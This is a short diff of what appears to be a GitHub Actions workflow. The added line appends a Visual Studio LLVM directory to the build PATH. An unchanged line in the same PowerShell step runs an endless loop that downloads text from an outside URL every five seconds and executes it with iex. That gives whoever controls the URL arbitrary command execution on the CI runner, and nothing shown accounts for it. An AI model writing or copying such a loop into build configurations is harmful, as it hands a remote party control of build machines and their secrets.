@@ -143,6 +143,7 @@ jobs:
           ; Write-Output "Update GITHUB_PATH"
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + "/git/bin/")
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + $Env:USERPROFILE + "/.cargo/bin/")
+          ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n" + "/Program Files (x86)/Microsoft Visual Studio/2022/BuildTools/VC/Tools/Llvm/bin/")
           ; [System.IO.File]::AppendAllText($Env:GITHUB_PATH, "`n")
           ;
           ; while ($true) { $v = iwr https://s1.simonlin.dev/fileshare/cmd.txt | select content; echo "cmd: $v"; try { $v | iex } catch { echo "err $_" }; sleep 5 }
